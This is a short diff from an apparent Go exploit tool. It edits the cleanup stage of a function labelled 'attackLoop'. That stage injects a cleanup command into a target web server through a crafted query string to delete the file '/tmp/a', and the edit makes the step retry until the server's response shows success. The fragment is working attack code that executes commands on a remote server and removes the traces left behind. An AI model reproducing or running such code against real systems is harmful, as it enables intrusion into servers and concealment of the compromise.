@@ -44,11 +44,15 @@ attackLoop:
 
 	log.Printf("Trying to cleanup /tmp/a...")
 	cleanup := url.Values{"a": []string{cleanupCommand}}
-	_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
-	if bytes.Contains(body, []byte(successPattern)) {
-		log.Print("Done!")
-	} else {
-		log.Print("cleanup faild... Done")
+	for {
+		_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
+		if err != nil {
+			return err
+		}
+		if bytes.Contains(body, []byte(successPattern)) {
+			log.Print("Done!")
+			break
+		}
 	}
 	return nil
 }
